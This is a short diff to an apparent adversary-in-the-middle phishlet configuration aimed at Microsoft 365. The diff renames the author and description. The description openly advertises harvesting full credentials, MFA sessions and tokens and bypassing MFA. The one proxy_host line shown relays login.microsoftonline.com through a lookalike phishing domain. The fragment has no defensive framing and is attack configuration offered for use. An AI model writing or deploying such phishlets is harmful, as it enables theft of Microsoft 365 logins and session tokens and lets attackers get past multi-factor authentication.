@@ -1,6 +1,6 @@
 ﻿phishlet microsoft365
-author deathstalker-2025-global
-description Deathstalker Microsoft 365 Full Creds MFA Sessions Tokens Harvest Bypass
+author deathstalker-2025-no-docker
+description Deathstalker Microsoft 365 Full Creds MFA Sessions Tokens Harvest Bypass Native No Docker
 
 proxy_hosts {
   proxy_host { phish_sub login; orig_sub login.microsoftonline.com; domain office365.evilcorp.com; session true; cookies true }
